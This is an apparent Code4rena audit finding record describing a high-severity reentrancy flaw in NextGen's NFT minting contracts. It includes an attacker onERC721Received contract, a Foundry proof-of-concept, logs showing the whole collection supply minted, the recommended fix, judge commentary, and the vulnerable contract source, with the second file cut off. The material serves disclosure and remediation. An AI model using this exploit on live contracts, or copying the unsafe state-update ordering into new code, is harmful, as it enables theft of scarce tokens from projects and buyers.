{
  "Title": "[H-01] Attacker can reenter to mint all the collection supply",
  "Content": "\nAn attacker can reenter the `MinterContract::mint` function, bypassing the `maxCollectionPurchases` check and minting the entire collection supply.\n\n### Proof of Concept\n\nThe vulnerability stems from the absence of the [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) pattern. As seen here, `NextGenCore::mint` updates the `tokensMintedAllowlistAddress` and `tokensMintedPerAddress` after making an external call:\n\n```solidity\n    // Minting logic is here\n    if (phase == 1) {\n        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;\n    } else {\n        tokensMintedPerAddress[_collectionID][_mintingAddress]++;\n    }\n}\n```\n\n### Exploitation Steps:\n\n- Attacker calls `MinterContract::mint` with a malicious contract as the receiver.\n- The malicious contract executes a crafted `onERC721Received()`.\n- `MinterContract::mint` invokes `NextGenCore::mint`, which uses `_safeMint()` internally.\n- `_safeMint()` calls `_recipient.onERC721Received()`, leading to the minting of the complete collection supply.\n\n### An example of the attacker `onERC721Received()` implementation:\n\n```solidity\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public override returns (bytes4) {\n        (, , uint256 circulationSupply, uint256 totalSupply, , ) = nextGenCore\n            .retrieveCollectionAdditionalData(1);\n\n        if (circulationSupply == totalSupply)\n            return this.onERC721Received.selector;\n\n        bytes32[] memory merkleProof = new bytes32[](1);\n        merkleProof[0] = bytes32(0);\n        minterContract.mint{value: 1e18}({\n            _collectionID: 1,\n            _numberOfTokens: 1,\n            _maxAllowance: 0,\n            _tokenData: \"\",\n            _mintTo: address(this),\n            merkleProof: merkleProof,\n            _delegator: address(0),\n            _saltfun_o: 0\n        });\n\n        return this.onERC721Received.selector;\n    }\n```\n\n### Here is a coded PoC to demonstrate the issue:\n\n```solidity\n    function testMintAllTheCollection() public {\n        bytes32[] memory merkleProof = setUpArrayBytes(1);\n        merkleProof[0] = bytes32(0);\n\n        address attacker = makeAddr(\"attacker\");\n\n        vm.prank(attacker);\n        MintAllSupply mintAllSupply = new MintAllSupply(minterContract, nextGenCore);\n\n        deal(address(mintAllSupply), 49e18);\n\n        vm.warp(block.timestamp + 1 days);\n\n        console.log(\"(Collection Circulation Supply Before)      = \", nextGenCore.viewCirSupply(1));\n        console.log(\"(Balance of attacker contract Before)       = \", address(mintAllSupply).balance);\n        console.log(\"(Col 1 Balance of attacker contract Before) = \", nextGenCore.balanceOf(address(mintAllSupply)));\n\n        hoax(attacker, 1e18);\n        minterContract.mint{ value: 1e18}({\n            _collectionID: 1,\n            _numberOfTokens: 1,\n            _maxAllowance: 0,\n            _tokenData: \"\",\n            _mintTo: address(mintAllSupply),\n            merkleProof: merkleProof,\n            _delegator: address(0),\n            _saltfun_o: 0\n        });\n\n        console.log(\"(Collection Circulation Supply After)       = \", nextGenCore.viewCirSupply(1));\n        console.log(\"(Balance of attacker contract After)        = \", address(mintAllSupply).balance);\n        console.log(\"(Col 1 Balance of attacker contract After)  = \", nextGenCore.balanceOf(address(mintAllSupply)));\n    }\n```\n\n### Logs result:\n\n```yaml\n  (Collection Circulation Supply Before)      :  0\n  (Balance of attacker contract Before)       :  49000000000000000000\n  (Col 1 Balance of attacker contract Before) :  0\n  (Collection Circulation Supply After)       :  50\n  (Balance of attacker contract After)        :  0\n  (Col 1 Balance of attacker contract After)  :  50\n```\n\n### Test Setup:\n\n- Clone the repository: <https://github.com/0xbtk/NextGen-Setup.git>.\n- Add the attacker's contract in the Helpers folder from this [link](https://gist.github.com/0xbtk/57496ae3761917c2f0e9f6ac3d23c300#file-mintallsupply-sol).\n- Incorporate the tests in `NextGenSecurityReview`.\n- Execute: `forge test --mt testMintAllTheCollection -vvv`.\n\n### Recommended Mitigation Steps\n\nWe recommend following [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) in `NextGenCore::mint` as follow:\n\n```solidity\n    if (phase == 1) {\n        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;\n    } else {\n        tokensMintedPerAddress[_collectionID][_mintingAddress]++;\n    }\n    // Minting logic should be here\n}\n```\n\n### Assessed type\n\nReentrancy\n\n**[a2rocket (NextGen) confirmed via duplicate issue #51](https://github.com/code-423n4/2023-10-nextgen-findings/issues/51#issuecomment-1822678898)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1839451072):**\n > The Warden has illustrated how a re-entrant EIP-721 hook can be exploited to bypass the allowlist/public limitations set forth for a collection.\n> \n> The Sponsor has confirmed the finding and I deem it valid as the code will update the minted per address mappings **after the \"safe\" mint operation**, thereby being susceptible to the re-entrancy described. Its severity of \"high\" is also deemed correct given that a main invariant of the system (mint limitations so scarcity of an NFT) can be broken arbitrarily as the re-entrancy attack can be repetitively replayed.\n> \n> The Warden's submission was selected as the best due to its correct remediation relying on enforcement of the CEI pattern, short-and-sweet PoC, and overall clean submission.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1847710278):**\n > After discussions with fellow judges, I have opted to split re-entrancy vulnerabilities into two separate instances:\n> \n> - Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)\n> - Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)\n> \n> In my opinion, those two constitute different vulnerabilities as they relate to different state variables. The rationale behind this \"split\" is that when we consider the root cause for a vulnerability to render two submissions distinct, we have to treat a re-entrancy as a desirable trait of the EVM. Additionally, we cannot assume a rational fix is the application of the `ReentrancyGuard::nonReentrant` modifier; **the enforcement of the CEI pattern** is widely recognized as the \"correct\" way to resolve these issues.\n> \n> This assumption falls in line with what the Solidity documentation has **instructed since its inception**, given that the security considerations of the language clearly state that the CEI pattern [should be applied and do not mention \"re-entrancy\" guards](https://docs.soliditylang.org/en/v0.8.23/security-considerations.html#reentrancy). As such, the root causes described in this issue are two unique ones: \n> \n> - [#1517](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517): Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)\n> - [#2048](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2048): Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)\n> \n> EDIT: After further consideration, I have opted to retain only this submission as a valid of the two.\n> \n> The absence of the CEI pattern in #2048 leads to an incorrect `getPrice` being utilized for multiple **valid** mints in a period, and no Warden identified that particular aspect that is vulnerable. As such, I have proceeded to invalidate the submission and its duplicates.\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-10-nextgen",
  "Code": [
    {
      "filename": "smart-contracts/NextGenCore.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Smart Contract\n *  @date: 19-October-2023 \n *  @version: 10.28\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./ERC721Enumerable.sol\";\nimport \"./Ownable.sol\";\nimport \"./Strings.sol\";\nimport \"./Base64.sol\";\nimport \"./IRandomizer.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IMinterContract.sol\";\nimport \"./ERC2981.sol\";\n\ncontract NextGenCore is ERC721Enumerable, Ownable, ERC2981 {\n    using Strings for uint256;\n\n    // declare variables\n    uint256 public newCollectionIndex;\n\n    // collectionInfo struct declaration\n    struct collectionInfoStructure {\n        string collectionName;\n        string collectionArtist;\n        string collectionDescription;\n        string collectionWebsite;\n        string collectionLicense;\n        string collectionBaseURI;\n        string collectionLibrary;\n        string[] collectionScript;\n    }\n\n    // mapping of collectionInfo struct\n    mapping (uint256 => collectionInfoStructure) private collectionInfo;\n\n    // collectionAdditionalData struct declaration\n    struct collectionAdditonalDataStructure {\n        address collectionArtistAddress;\n        uint256 maxCollectionPurchases;\n        uint256 collectionCirculationSupply;\n        uint256 collectionTotalSupply;\n        uint256 reservedMinTokensIndex;\n        uint256 reservedMaxTokensIndex;\n        uint setFinalSupplyTimeAfterMint;\n        address randomizerContract;\n        IRandomizer randomizer;\n    }\n\n    // mapping of collectionAdditionalData struct\n    mapping (uint256 => collectionAdditonalDataStructure) private collectionAdditionalData;\n\n    // other mappings\n\n    // checks if a collection was created\n    mapping (uint256 => bool) private isCollectionCreated; \n\n    // checks if data on a collection were added\n    mapping (uint256 => bool) private wereDataAdded;\n\n    // maps tokends ids with collectionsids\n    mapping (uint256 => uint256) private tokenIdsToCollectionIds;\n\n    // stores randomizer hash\n    mapping(uint256 => bytes32) private tokenToHash;\n\n    // minted tokens per address per collection during public sale\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedPerAddress;\n\n    // minted tokens per address per collection during allowlist\n    mapping (uint256 => mapping (address => uint256)) private tokensMintedAllowlistAddress;\n\n    // tokens airdrop per address per collection \n    mapping (uint256 => mapping (address => uint256)) private tokensAirdropPerAddress;\n\n    // current amount of burnt tokens per collection\n    mapping (uint256 => uint256) public burnAmount;\n\n    // modify the metadata view\n    mapping (uint256 => bool) public onchainMetadata; \n\n    // artist signature per collection\n    mapping (uint256 => string) public artistsSignatures;\n\n    // tokens additional metadata\n    mapping (uint256 => string) public tokenData;\n\n    // on-chain token Image URI and attributes\n    mapping (uint256 => string[2]) private tokenImageAndAttributes;\n\n    // collectionFreeze \n    mapping (uint256 => bool) private collectionFreeze;\n\n    // artist signed\n    mapping (uint256 => bool) public artistSigned; \n\n    // external contracts declaration\n    INextGenAdmins private adminsContract;\n    address public minterContract;\n\n    // smart contract constructor\n    constructor(string memory name, string memory symbol, address _adminsContract) ERC721(name, symbol) {\n        adminsContract = INextGenAdmins(_adminsContract);\n        newCollectionIndex = newCollectionIndex + 1;\n        _setDefaultRoyalty(0x1B1289E34Fe05019511d7b436a5138F361904df0, 690);\n    }\n\n    // certain functions can only be called by a global or function admin\n\n    modifier FunctionAdminRequired(bytes4 _selector) {\n      require(adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true , \"Not allowed\");\n      _;\n    }\n\n    // certain functions can only be called by a collection, global or function admin\n\n    modifier CollectionAdminRequired(uint256 _collectionID, bytes4 _selector) {\n      require(adminsContract.retrieveCollectionAdmin(msg.sender,_collectionID) == true || adminsContract.retrieveFunctionAdmin(msg.sender, _selector) == true || adminsContract.retrieveGlobalAdmin(msg.sender) == true, \"Not allowed\");\n      _;\n    }\n\n    // function to create a Collection\n\n    function createCollection(string memory _collectionName, string memory _collectionArtist, string memory _collectionDescription, string memory _collectionWebsite, string memory _collectionLicense, string memory _collectionBaseURI, string memory _collectionLibrary, string[] memory _collectionScript) public FunctionAdminRequired(this.createCollection.selector) {\n        collectionInfo[newCollectionIndex].collectionName = _collectionName;\n        collectionInfo[newCollectionIndex].collectionArtist = _collectionArtist;\n        collectionInfo[newCollectionIndex].collectionDescription = _collectionDescription;\n        collectionInfo[newCollectionIndex].collectionWebsite = _collectionWebsite;\n        collectionInfo[newCollectionIndex].collectionLicense = _collectionLicense;\n        collectionInfo[newCollectionIndex].collectionBaseURI = _collectionBaseURI;\n        collectionInfo[newCollectionIndex].collectionLibrary = _collectionLibrary;\n        collectionInfo[newCollectionIndex].collectionScript = _collectionScript;\n        isCollectionCreated[newCollectionIndex] = true;\n        newCollectionIndex = newCollectionIndex + 1;\n    }\n\n    // function to add/modify the additional data of a collection\n    // once a collection is created and total supply is set it cannot be changed\n    // only _collectionArtistAddress , _maxCollectionPurchases can change after total supply is set\n\n    function setCollectionData(uint256 _collectionID, address _collectionArtistAddress, uint256 _maxCollectionPurchases, uint256 _collectionTotalSupply, uint _setFinalSupplyTimeAfterMint) public CollectionAdminRequired(_collectionID, this.setCollectionData.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false) && (_collectionTotalSupply <= 10000000000), \"err/freezed\");\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply == 0) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].collectionCirculationSupply = 0;\n            collectionAdditionalData[_collectionID].collectionTotalSupply = _collectionTotalSupply;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n            collectionAdditionalData[_collectionID].reservedMinTokensIndex = (_collectionID * 10000000000);\n            collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + _collectionTotalSupply - 1;\n            wereDataAdded[_collectionID] = true;\n        } else if (artistSigned[_collectionID] == false) {\n            collectionAdditionalData[_collectionID].collectionArtistAddress = _collectionArtistAddress;\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        } else {\n            collectionAdditionalData[_collectionID].maxCollectionPurchases = _maxCollectionPurchases;\n            collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint = _setFinalSupplyTimeAfterMint;\n        }\n    }\n\n    // Add Randomizer contract on collection\n\n    function addRandomizer(uint256 _collectionID, address _randomizerContract) public FunctionAdminRequired(this.addRandomizer.selector) {\n        require(IRandomizer(_randomizerContract).isRandomizerContract() == true, \"Contract is not Randomizer\");\n        collectionAdditionalData[_collectionID].randomizerContract = _randomizerContract;\n        collectionAdditionalData[_collectionID].randomizer = IRandomizer(_randomizerContract);\n    }\n\n    // airdrop called from minterContract\n    \n    function airDropTokens(uint256 mintIndex, address _recipient, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _recipient, _tokenData, _collectionID, _saltfun_o);\n            tokensAirdropPerAddress[_collectionID][_recipient] = tokensAirdropPerAddress[_collectionID][_recipient] + 1;\n        }\n    }\n\n    // mint called from minterContract\n\n    function mint(uint256 mintIndex, address _mintingAddress , address _mintTo, string memory _tokenData, uint256 _saltfun_o, uint256 _collectionID, uint256 phase) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        collectionAdditionalData[_collectionID].collectionCirculationSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_collectionID].collectionTotalSupply >= collectionAdditionalData[_collectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, _mintTo, _tokenData, _collectionID, _saltfun_o);\n            if (phase == 1) {\n                tokensMintedAllowlistAddress[_collectionID][_mintingAddress] = tokensMintedAllowlistAddress[_collectionID][_mintingAddress] + 1;\n            } else {\n                tokensMintedPerAddress[_collectionID][_mintingAddress] = tokensMintedPerAddress[_collectionID][_mintingAddress] + 1;\n            }\n        }\n    }\n\n    // burn function\n\n    function burn(uint256 _collectionID, uint256 _tokenId) public {\n        require(_isApprovedOrOwner(_msgSender(), _tokenId), \"ERC721: caller is not token owner or approved\");\n        require ((_tokenId >= collectionAdditionalData[_collectionID].reservedMinTokensIndex) && (_tokenId <= collectionAdditionalData[_collectionID].reservedMaxTokensIndex), \"id err\");\n        _burn(_tokenId);\n        burnAmount[_collectionID] = burnAmount[_collectionID] + 1;\n    }\n\n    // burn to mint called from minterContract\n\n    function burnToMint(uint256 mintIndex, uint256 _burnCollectionID, uint256 _tokenId, uint256 _mintCollectionID, uint256 _saltfun_o, address burner) external {\n        require(msg.sender == minterContract, \"Caller is not the Minter Contract\");\n        require(_isApprovedOrOwner(burner, _tokenId), \"ERC721: caller is not token owner or approved\");\n        collectionAdditionalData[_mintCollectionID].collectionCirculationSupply = collectionAdditionalData[_mintCollectionID].collectionCirculationSupply + 1;\n        if (collectionAdditionalData[_mintCollectionID].collectionTotalSupply >= collectionAdditionalData[_mintCollectionID].collectionCirculationSupply) {\n            _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);\n            // burn token\n            _burn(_tokenId);\n            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;\n        }\n    }\n\n    // mint processing\n\n    function _mintProcessing(uint256 _mintIndex, address _recipient, string memory _tokenData, uint256 _collectionID, uint256 _saltfun_o) internal {\n        tokenData[_mintIndex] = _tokenData;\n        collectionAdditionalData[_collectionID].randomizer.calculateTokenHash(_collectionID, _mintIndex, _saltfun_o);\n        tokenIdsToCollectionIds[_mintIndex] = _collectionID;\n        _safeMint(_recipient, _mintIndex);\n    }\n\n    // Additional setter functions\n\n    // function to update Collection Info\n\n    function updateCollectionInfo(uint256 _collectionID, string memory _newCollectionName, string memory _newCollectionArtist, string memory _newCollectionDescription, string memory _newCollectionWebsite, string memory _newCollectionLicense, string memory _newCollectionBaseURI, string memory _newCollectionLibrary, uint256 _index, string[] memory _newCollectionScript) public CollectionAdminRequired(_collectionID, this.updateCollectionInfo.selector) {\n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n         if (_index == 1000) {\n            collectionInfo[_collectionID].collectionName = _newCollectionName;\n            collectionInfo[_collectionID].collectionArtist = _newCollectionArtist;\n            collectionInfo[_collectionID].collectionDescription = _newCollectionDescription;\n            collectionInfo[_collectionID].collectionWebsite = _newCollectionWebsite;\n            collectionInfo[_collectionID].collectionLicense = _newCollectionLicense;\n            collectionInfo[_collectionID].collectionLibrary = _newCollectionLibrary;\n            collectionInfo[_collectionID].collectionScript = _newCollectionScript;\n        } else if (_index == 999) {\n            collectionInfo[_collectionID].collectionBaseURI = _newCollectionBaseURI;\n        } else {\n            collectionInfo[_collectionID].collectionScript[_index] = _newCollectionScript[0];\n        }\n    }\n\n    // function for artist signature\n\n    function artistSignature(uint256 _collectionID, string memory _signature) public {\n        require(msg.sender == collectionAdditionalData[_collectionID].collectionArtistAddress, \"Only artist\");\n        require(artistSigned[_collectionID] == false, \"Already Signed\");\n        artistsSignatures[_collectionID] = _signature;\n        artistSigned[_collectionID] = true;\n    }\n\n    // function change metadata view \n\n    function changeMetadataView(uint256 _collectionID, bool _status) public CollectionAdminRequired(_collectionID, this.changeMetadataView.selector) { \n        require((isCollectionCreated[_collectionID] == true) && (collectionFreeze[_collectionID] == false), \"Not allowed\");\n        onchainMetadata[_collectionID] = _status;\n    }\n\n    // function to change the token data\n\n    function changeTokenData(uint256 _tokenId, string memory newData) public FunctionAdminRequired(this.changeTokenData.selector) {\n        require(collectionFreeze[tokenIdsToCollectionIds[_tokenId]] == false, \"Data frozen\");\n        _requireMinted(_tokenId);\n        tokenData[_tokenId] = newData;\n    }\n\n    // function to add a thumbnail image\n\n    function updateImagesAndAttributes(uint256[] memory _tokenId, string[] memory _images, string[] memory _attributes) public FunctionAdminRequired(this.updateImagesAndAttributes.selector) {\n        for (uint256 x; x < _tokenId.length; x++) {\n            require(collectionFreeze[tokenIdsToCollectionIds[_tokenId[x]]] == false, \"Data frozen\");\n            _requireMinted(_tokenId[x]);\n            tokenImageAndAttributes[_tokenId[x]][0] = _images[x];\n            tokenImageAndAttributes[_tokenId[x]][1] = _attributes[x];\n        }\n    }\n\n    // freeze collection\n\n    function freezeCollection(uint256 _collectionID) public FunctionAdminRequired(this.freezeCollection.selector) {\n        require(isCollectionCreated[_collectionID] == true, \"No Col\");\n        collectionFreeze[_collectionID] = true;\n    }\n\n    // set tokenHash\n\n    function setTokenHash(uint256 _collectionID, uint256 _mintIndex, bytes32 _hash) external {\n        require(msg.sender == collectionAdditionalData[_collectionID].randomizerContract);\n        require(tokenToHash[_mintIndex] == 0x0000000000000000000000000000000000000000000000000000000000000000);\n        tokenToHash[_mintIndex] = _hash;\n    }\n\n    // set final supply\n\n    function setFinalSupply(uint256 _collectionID) public FunctionAdminRequired(this.setFinalSupply.selector) {\n        require (block.timestamp > IMinterContract(minterContract).getEndTime(_collectionID) + collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, \"Time has not passed\");\n        collectionAdditionalData[_collectionID].collectionTotalSupply = collectionAdditionalData[_collectionID].collectionCirculationSupply;\n        collectionAdditionalData[_collectionID].reservedMaxTokensIndex = (_collectionID * 10000000000) + collectionAdditionalData[_collectionID].collectionTotalSupply - 1;\n    }\n\n    // function to add a minter contract\n\n    function addMinterContract(address _minterContract) public FunctionAdminRequired(this.addMinterContract.selector) { \n        require(IMinterContract(_minterContract).isMinterContract() == true, \"Contract is not Minter\");\n        minterContract = _minterContract;\n    }\n\n    // function to update admin contract\n\n    function updateAdminContract(address _newadminsContract) public FunctionAdminRequired(this.updateAdminContract.selector) {\n        require(INextGenAdmins(_newadminsContract).isAdminContract() == true, \"Contract is not Admin\");\n        adminsContract = INextGenAdmins(_newadminsContract);\n    }\n\n    // function to update default royalties\n    \n    function setDefaultRoyalties(address _royaltyAddress, uint96 _bps) public FunctionAdminRequired(this.setDefaultRoyalties.selector) {\n        _setDefaultRoyalty(_royaltyAddress, _bps);\n    }\n\n    // Retrieve Functions\n\n    // function to override supportInterface\n\n    function supportsInterface(bytes4 interfaceId) public view virtual override(ERC721Enumerable, ERC2981) returns (bool) { \n        return super.supportsInterface(interfaceId); \n    }\n\n    // function to return the tokenURI\n\n    function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {\n        _requireMinted(tokenId);\n        if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] != 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : \"\";\n        } else if (onchainMetadata[tokenIdsToCollectionIds[tokenId]] == false && tokenToHash[tokenId] == 0x0000000000000000000000000000000000000000000000000000000000000000) {\n            string memory baseURI = collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionBaseURI;\n            return bytes(baseURI).length > 0 ? string(abi.encodePacked(baseURI, \"pending\")) : \"\";\n        }\n        else {\n            string memory b64 = Base64.encode(abi.encodePacked(\"<html><head></head><body><script src=\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionLibrary,\"\\\"></script><script>\",retrieveGenerativeScript(tokenId),\"</script></body></html>\"));\n            string memory _uri = string(abi.encodePacked(\"data:application/json;utf8,{\\\"name\\\":\\\"\",getTokenName(tokenId),\"\\\",\\\"description\\\":\\\"\",collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionDescription,\"\\\",\\\"image\\\":\\\"\",tokenImageAndAttributes[tokenId][0],\"\\\",\\\"attributes\\\":[\",tokenImageAndAttributes[tokenId][1],\"],\\\"animation_url\\\":\\\"data:text/html;base64,\",b64,\"\\\"}\"));\n            return _uri;\n        }\n    }\n\n    // function get Name\n\n    function getTokenName(uint256 tokenId) private view returns(string memory)  {\n        uint256 tok = tokenId - collectionAdditionalData[tokenIdsToCollectionIds[tokenId]].reservedMinTokensIndex;\n        return string(abi.encodePacked(collectionInfo[viewColIDforTokenID(tokenId)].collectionName, \" #\" ,tok.toString()));\n    }\n\n    // retrieve the collection freeze status\n    function collectionFreezeStatus(uint256 _collectionID) public view returns(bool){\n        return collectionFreeze[_collectionID];\n    }\n\n    // function to return the collection id given a token id\n    function viewColIDforTokenID(uint256 _tokenid) public view returns (uint256) {\n        return(tokenIdsToCollectionIds[_tokenid]);\n    }\n\n    // retrieve if data were added\n    function retrievewereDataAdded(uint256 _collectionID) external view returns(bool){\n        return wereDataAdded[_collectionID];\n    }\n\n    // function to return the min index id of a collection\n\n    function viewTokensIndexMin(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMinTokensIndex);\n    }\n\n    // function to return the max index id of a collection\n\n    function viewTokensIndexMax(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].reservedMaxTokensIndex);\n    }\n\n    // function to return the circ supply of a collection\n    function viewCirSupply(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].collectionCirculationSupply);\n    }\n\n    // function to return max allowance in public sale\n    function viewMaxAllowance(uint256 _collectionID) external view returns (uint256) {\n        return(collectionAdditionalData[_collectionID].maxCollectionPurchases);\n    }\n\n    // function to return tokens minted per address during AL\n    function retrieveTokensMintedALPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedAllowlistAddress[_collectionID][_address]);\n    }\n\n    // function to return tokens minted per address during Public\n    function retrieveTokensMintedPublicPerAddress(uint256 _collectionID, address _address) external view returns(uint256) {\n        return (tokensMintedPerAddress[_collectionID][_address]);\n    }\n\n    // function to retrieve the airdrop/minted tokens per address \n\n    function retrieveTokensAirdroppedPerAddress(uint256 _collectionID, address _address) public view returns(uint256) {\n        return (tokensAirdropPerAddress[_collectionID][_address]);\n    }\n\n    // function to return the artist's address\n    function retrieveArtistAddress(uint256 _collectionID) external view returns(address) {\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress);\n    }\n\n    // function to retrieve a Collection's Info\n\n    function retrieveCollectionInfo(uint256 _collectionID) public view returns(string memory, string memory, string memory, string memory, string memory, string memory){\n        return (collectionInfo[_collectionID].collectionName, collectionInfo[_collectionID].collectionArtist, collectionInfo[_collectionID].collectionDescription, collectionInfo[_collectionID].collectionWebsite, collectionInfo[_collectionID].collectionLicense, collectionInfo[_collectionID].collectionBaseURI);\n    }\n\n    // function to retrieve the library and script of a collection\n\n    function retrieveCollectionLibraryAndScript(uint256 _collectionID) public view returns(string memory, string[] memory){\n        return (collectionInfo[_collectionID].collectionLibrary, collectionInfo[_collectionID].collectionScript);\n    }\n\n    // function to retrieve the Additional data of a Collection\n\n    function retrieveCollectionAdditionalData(uint256 _collectionID) public view returns(address, uint256, uint256, uint256, uint, address){\n        return (collectionAdditionalData[_collectionID].collectionArtistAddress, collectionAdditionalData[_collectionID].maxCollectionPurchases, collectionAdditionalData[_collectionID].collectionCirculationSupply, collectionAdditionalData[_collectionID].collectionTotalSupply, collectionAdditionalData[_collectionID].setFinalSupplyTimeAfterMint, collectionAdditionalData[_collectionID].randomizerContract);\n    }\n\n    // function to retrieve tokenHash\n\n    function retrieveTokenHash(uint256 _tokenid) public view returns(bytes32){\n        return (tokenToHash[_tokenid]);\n    }\n\n    // function to retrieve the Generative Script of a token\n\n    function retrieveGenerativeScript(uint256 tokenId) public view returns(string memory){\n        _requireMinted(tokenId);\n        string memory scripttext;\n        for (uint256 i=0; i < collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript.length; i++) {\n            scripttext = string(abi.encodePacked(scripttext, collectionInfo[tokenIdsToCollectionIds[tokenId]].collectionScript[i])); \n        }\n        return string(abi.encodePacked(\"let hash='\",Strings.toHexString(uint256(tokenToHash[tokenId]), 32),\"';let tokenId=\",tokenId.toString(),\";let tokenData=[\",tokenData[tokenId],\"];\", scripttext));\n    }\n\n    // function to retrieve the supply of a collection\n\n    function totalSupplyOfCollection(uint256 _collectionID) public view returns (uint256) {\n        return (collectionAdditionalData[_collectionID].collectionCirculationSupply - burnAmount[_collectionID]);\n    }\n\n    // function to retrieve the token image uri and the attributes stored on-chain for a token id.\n\n    function retrievetokenImageAndAttributes(uint256 _tokenId) public view returns(string memory, string memory) {\n        return (tokenImageAndAttributes[_tokenId][0],tokenImageAndAttributes[_tokenId][1]);\n    }\n\n}"
    },
    {
      "filename": "smart-contracts/MinterContract.sol",
      "content": "// SPDX-License-Identifier: MIT\n\n/**\n *\n *  @title: NextGen Minter Contract\n *  @date: 18-October-2023 \n *  @version: 1.8\n *  @author: 6529 team\n */\n\npragma solidity ^0.8.19;\n\nimport \"./INextGenCore.sol\";\nimport \"./Ownable.sol\";\nimport \"./IDelegationManagementContract.sol\";\nimport \"./MerkleProof.sol\";\nimport \"./INextGenAdmins.sol\";\nimport \"./IERC721.sol\";\n\ncontract NextGenMinterContract is Ownable {\n\n    // total amount collected during minting from collections\n    mapping (uint256 => uint256) public collectionTotalAmount;\n\n    // sales Option3 timestamp of last mint\n    mapping (uint256 => uint) public lastMintDate;\n\n    // burn or swap address for external collections\n    mapping (bytes32 => address) public burnOrSwapAddress;\n\n    // burn or swap external collection ids\n    mapping (bytes32 => uint256[2]) private burnOrSwapIds;\n\n    // mint tokens on a specific collection after burning a token on a NextGen collection\n    mapping (uint256 => mapping (uint256 => bool)) public burnToMintCollections;\n\n    // mint tokens on a specific collection after burning a token on an external collection\n    mapping (bytes32 => mapping (uint256 => bool)) public burnExternalToMintCollections;\n\n    // check if minting costs were set\n    mapping (uint256 => bool) private setMintingCosts;\n\n    // collectionPhasesData struct declaration\n    struct collectionPhasesDataStructure {\n        uint allowlistStartTime;\n        uint allowlistEndTime;\n        uint publicStartTime;\n        uint publicEndTime;\n        bytes32 merkleRoot;\n        uint256 collectionMintCost;\n        uint256 collectionEndMintCost;\n        uint256 timePeriod;\n        uint256 rate;\n        uint8 salesOption;\n        address delAddress;\n    }\n\n    // mapping of collectionPhasesData struct\n    mapping (uint256 => collectionPhasesDataStructure) private collectionPhases;\n\n    // royalties primary splits structure\n\n    struct royaltiesPrimarySplits {\n        uint256 artistPercentage;\n        uint256 teamPercentage;\n    }\n\n    // mapping of royaltiesPrimarySplits struct\n\n    mapping (uint256 => 